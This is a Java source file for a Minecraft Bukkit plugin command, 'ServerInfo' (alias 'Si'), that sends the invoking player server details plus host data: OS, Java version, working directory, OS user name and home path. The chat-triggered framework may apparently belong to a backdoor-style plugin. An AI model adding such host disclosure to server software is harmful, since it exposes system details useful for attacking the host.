package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ServerInfo extends Command {

    public ServerInfo() {
        super("ServerInfo", "ServerInfo", "View detailed information about the server", CommandCategory.SERVER, "Si");
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        ChatUtils.sendMessage(p, "Players: §a" + Bukkit.getOnlinePlayers().size() + "§7/§a" + Bukkit.getMaxPlayers());
        ChatUtils.sendMessage(p, "Version: §a" + Bukkit.getBukkitVersion());
        ChatUtils.sendMessage(p, "Server Name: §a" + Bukkit.getServerName());
        ChatUtils.sendMessage(p, "Server MOTD: §a" + Bukkit.getMotd());
        ChatUtils.sendMessage(p, "Running Directory: §a" + System.getProperty("user.dir"));
        ChatUtils.sendMessage(p, "Java Version: §a" + System.getProperty("java.version"));
        ChatUtils.sendMessage(p, "OS: §a" + System.getProperty("os.name"));
        ChatUtils.sendMessage(p, "OS Version: §a" + System.getProperty("os.version"));
        ChatUtils.sendMessage(p, "User Name: §a" + System.getProperty("user.name"));
        ChatUtils.sendMessage(p, "User Home: §a" + System.getProperty("user.home"));


    }

}
